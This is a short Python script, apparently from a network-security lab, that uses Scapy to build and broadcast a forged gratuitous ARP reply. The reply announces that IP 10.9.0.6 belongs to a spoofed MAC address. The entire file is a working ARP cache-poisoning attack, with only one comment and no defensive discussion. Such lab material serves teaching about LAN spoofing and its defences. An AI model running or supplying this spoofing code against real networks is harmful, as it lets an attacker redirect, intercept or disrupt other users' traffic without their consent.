#!/usr/bin/env python3
from scapy.all import *

MAC_spoofed = "b6:cd:e6:cb:55:70"
IP_spoofed  = "10.9.0.6"

# Gratuitous ARP: "IP_spoofed is at MAC_spoofed" announced to the LAN
eth = Ether(src=MAC_spoofed, dst="ff:ff:ff:ff:ff:ff")
arp = ARP(
    op=2,
    hwsrc=MAC_spoofed,
    psrc=IP_spoofed,
    hwdst="00:00:00:00:00:00",
    pdst=IP_spoofed
)

pkt = eth / arp
print(pkt.summary())
sendp(pkt)